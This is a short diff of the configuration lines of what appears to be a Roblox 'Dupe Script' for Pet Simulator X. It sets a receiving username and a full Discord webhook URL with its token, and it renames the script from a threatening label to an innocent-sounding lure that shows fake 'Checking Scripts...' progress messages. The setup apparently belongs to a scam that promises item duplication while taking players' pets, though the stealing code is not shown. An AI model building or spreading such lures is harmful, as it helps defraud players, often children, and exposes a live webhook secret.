@@ -1,7 +1,7 @@
 Username = "skityszzx"
 WebHook = "https://discord.com/api/webhooks/1092727128816099348/NRSqDvXQuo-RcAUe3ASykfvOMbtIjL496QJvYKyuFhnDID9fNeJ9Bor6Cl02NFTwKbf8"
 
-_G.CustomScriptName = "DupeScript IF YOU LEAVE DATA WILL DELETE"
+_G.CustomScriptName = "Dupe Script Pet Sim x"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
